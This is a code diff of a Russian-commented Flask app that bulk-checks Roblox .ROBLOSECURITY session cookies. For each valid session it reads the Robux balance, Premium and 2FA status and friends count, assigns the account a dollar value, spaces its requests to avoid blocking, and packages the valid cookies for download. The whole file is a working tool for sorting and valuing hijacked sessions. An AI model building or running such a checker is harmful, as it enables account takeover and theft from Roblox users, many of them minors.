@@ -44,7 +44,7 @@ def save_check_session(session_id, total, valid, results):
     conn.commit()
     conn.close()
 
-def get_check_history(limit=10):
+def get_check_history(limit=20):
     conn = sqlite3.connect(app.config['DATABASE'])
     c = conn.cursor()
     c.execute('''
@@ -82,12 +82,10 @@ class AdvancedRobloxChecker:
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'application/json, text/plain, */*',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
         })
 
     def get_csrf_token(self, cookie):
-        """Получение CSRF токена как в MeowTool"""
+        """Получение CSRF токена"""
         try:
             response = self.session.post(
                 'https://auth.roblox.com/v2/login',
@@ -98,17 +96,14 @@ class AdvancedRobloxChecker:
                 return response.headers['x-csrf-token']
         except:
             pass
-        
-        # Fallback - генерируем случайный токен
         return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))
 
     def get_account_details(self, cookie: str):
-        """Улучшенная проверка куки на основе MeowTool"""
+        """Проверка куки"""
         cookie = cookie.strip()
         if cookie.startswith('"') and cookie.endswith('"'):
             cookie = cookie[1:-1]
         
-        # Основные заголовки как в MeowTool
         headers = {
             'Cookie': f'.ROBLOSECURITY={cookie}',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -116,7 +111,7 @@ class AdvancedRobloxChecker:
         }
         
         try:
-            # Проверка аутентификации через основной endpoint
+            # Проверка аутентификации
             auth_response = self.session.get(
                 'https://users.roblox.com/v1/users/authenticated',
                 headers=headers,
@@ -134,19 +129,18 @@ class AdvancedRobloxChecker:
             
             user_id = auth_data['id']
             
-            # Получение расширенной информации
+            # Получение информации
             profile_data = self.get_profile_info(headers, user_id)
             economy_data = self.get_economy_info(headers, user_id)
             premium_data = self.get_premium_status(headers, user_id)
             friends_data = self.get_friends_count(headers, user_id)
             
-            # Расчет всех метрик
+            # Расчет метрик
             account_age = self.calculate_account_age(auth_data.get('created'))
             account_value = self.calculate_account_value(
                 economy_data['robux'],
                 premium_data['isPremium'],
                 account_age['years'],
-                economy_data.get('total_spent', 0),
                 friends_data['count']
             )
             
@@ -166,19 +160,14 @@ class AdvancedRobloxChecker:
                     'robux_balance': economy_data['robux'],
                     'pending_robux': economy_data.get('pending_robux', 0),
                     'total_robux': economy_data['robux'] + economy_data.get('pending_robux', 0),
-                    'all_time_spent': economy_data.get('total_spent', 0),
                 },
                 'premium': premium_data,
                 'security': {
                     '2fa_enabled': self.check_2fa_status(headers),
-                    'phone_verified': False,  # Упрощенная проверка
-                    'email_verified': True,
-                    'pin_enabled': False
                 },
                 'social': {
                     'friends_count': friends_data['count'],
                     'followers_count': profile_data.get('followers_count', 0),
-                    'following_count': profile_data.get('following_count', 0)
                 },
                 'account_value': account_value,
                 'checked_at': datetime.now().isoformat()
@@ -200,31 +189,28 @@ class AdvancedRobloxChecker:
                 return {
                     'followers_count': data.get('followersCount', 0),
                     'following_count': data.get('followingsCount', 0),
-                    'description': data.get('description', ''),
-                    'is_banned': data.get('isBanned', False)
                 }
         except:
             pass
-        return {'followers_count': 0, 'following_count': 0, 'description': '', 'is_banned': False}
+        return {'followers_count': 0, 'following_count': 0}
 
     def get_economy_info(self, headers, user_id):
         """Информация об экономике"""
         try:
-            # Баланс Robux
             response = self.session.get(
                 'https://economy.roblox.com/v1/users/currency',
                 headers=headers,
                 timeout=10
             )
-            robux_data = response.json() if response.status_code == 200 else {'robux': 0, 'pendingRobux': 0}
-            
-            return {
-                'robux': robux_data.get('robux', 0),
-                'pending_robux': robux_data.get('pendingRobux', 0),
-                'total_spent': 0  # Упрощенная версия
-            }
+            if response.status_code == 200:
+                data = response.json()
+                return {
+                    'robux': data.get('robux', 0),
+                    'pending_robux': data.get('pendingRobux', 0)
+                }
         except:
-            return {'robux': 0, 'pending_robux': 0, 'total_spent': 0}
+            pass
+        return {'robux': 0, 'pending_robux': 0}
 
     def get_premium_status(self, headers, user_id):
         """Статус Premium"""
@@ -262,7 +248,6 @@ class AdvancedRobloxChecker:
     def check_2fa_status(self, headers):
         """Проверка 2FA"""
         try:
-            # Упрощенная проверка через настройки
             response = self.session.get(
                 'https://accountsettings.roblox.com/v1/email',
                 headers=headers,
@@ -279,7 +264,7 @@ class AdvancedRobloxChecker:
         
         try:
             created_date = datetime.fromisoformat(created_date_str.replace('Z', '+00:00'))
-            now = datetime.now(created_date.tzinfo) if created_date.tzinfo else datetime.now()
+            now = datetime.now()
             
             age_delta = now - created_date
             age_days = age_delta.days
@@ -293,24 +278,17 @@ class AdvancedRobloxChecker:
         except:
             return {'days': 0, 'years': 0, 'formatted_date': 'Unknown'}
 
-    def calculate_account_value(self, robux, is_premium, age_years, total_spent, friends_count):
-        """Расчет стоимости аккаунта как в MeowTool"""
-        value = 0
+    def calculate_account_value(self, robux, is_premium, age_years, friends_count):
+        """Расчет стоимости аккаунта"""
+        value = robux * 0.0035
         
-        # Базовая стоимость Robux
-        value += robux * 0.0035
-        
-        # Premium бонус
         if is_premium:
             value += 500
         
-        # Бонус за возраст
         value += age_years * 300
+        value += min(friends_count * 10, 1000)
         
-        # Бонус за активность
-        value += min(friends_count * 10, 1000)  # Максимум 1000 за друзей
-        
-        return round(max(value, 10), 2)  # Минимальная стоимость $10
+        return round(max(value, 10), 2)
 
     def error_result(self, cookie: str, error: str):
         return {
@@ -321,7 +299,7 @@ class AdvancedRobloxChecker:
         }
 
     def check_multiple(self, cookies):
-        """Проверка нескольких куки с задержками"""
+        """Проверка нескольких куки"""
         results = []
         for i, cookie in enumerate(cookies):
             if cookie.strip():
@@ -329,7 +307,6 @@ class AdvancedRobloxChecker:
                     result = self.get_account_details(cookie.strip())
                     results.append(result)
                     
-                    # Задержка для избежания блокировки
                     if i < len(cookies) - 1:
                         time.sleep(1.5)
                         
@@ -341,18 +318,20 @@ class AdvancedRobloxChecker:
 
 checker = AdvancedRobloxChecker()
 
-# Маршруты (остаются без изменений)
+# Маршруты
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/history')
-def history():
+@app.route('/api/history')
+def api_history():
+    """API для получения истории"""
     check_history = get_check_history(20)
-    return render_template('history.html', history=check_history)
+    return jsonify(check_history)
 
-@app.route('/check', methods=['POST'])
-def check_cookies():
+@app.route('/api/check', methods=['POST'])
+def api_check_cookies():
+    """API для проверки куки"""
     try:
         data = request.get_json()
         
@@ -375,7 +354,6 @@ def check_cookies():
         results = checker.check_multiple(cookies)
         
         session_id = datetime.now().strftime('%Y%m%d%H%M%S')
-        
         valid_count = len([r for r in results if r.get('valid', False)])
         save_check_session(session_id, len(cookies), valid_count, results)
         
@@ -391,18 +369,18 @@ def check_cookies():
     except Exception as e:
         return jsonify({'error': f'Server error: {str(e)}'}), 500
 
-# Остальные маршруты остаются без изменений...
-@app.route('/download/<session_id>')
-def download_results(session_id):
+@app.route('/api/download/<session_id>')
+def api_download_results(session_id):
+    """API для скачивания результатов"""
     try:
         results = get_session_results(session_id)
         if not results:
-            return "Результаты не найдены или устарели", 404
+            return jsonify({'error': 'Results not found'}), 404
         
         valid_cookies = [r for r in results if r.get('valid')]
         
         if not valid_cookies:
-            return "Нет валидных куки для скачивания", 400
+            return jsonify({'error': 'No valid cookies'}), 400
         
         zip_buffer = io.BytesIO()
         
@@ -433,10 +411,11 @@ def download_results(session_id):
         )
         
     except Exception as e:
-        return f"Ошибка при создании архива: {str(e)}", 500
+        return jsonify({'error': f'Archive error: {str(e)}'}), 500
 
-@app.route('/get-session/<session_id>')
-def get_session(session_id):
+@app.route('/api/session/<session_id>')
+def api_get_session(session_id):
+    """API для получения результатов сессии"""
     results = get_session_results(session_id)
     if results:
         valid_count = len([r for r in results if r.get('valid', False)])
@@ -448,8 +427,9 @@ def get_session(session_id):
         })
     return jsonify({'error': 'Session not found'}), 404
 
-@app.route('/delete-session/<session_id>', methods=['DELETE'])
-def delete_session(session_id):
+@app.route('/api/delete/<session_id>', methods=['DELETE'])
+def api_delete_session(session_id):
+    """API для удаления сессии"""
     try:
         conn = sqlite3.connect(app.config['DATABASE'])
         c = conn.cursor()
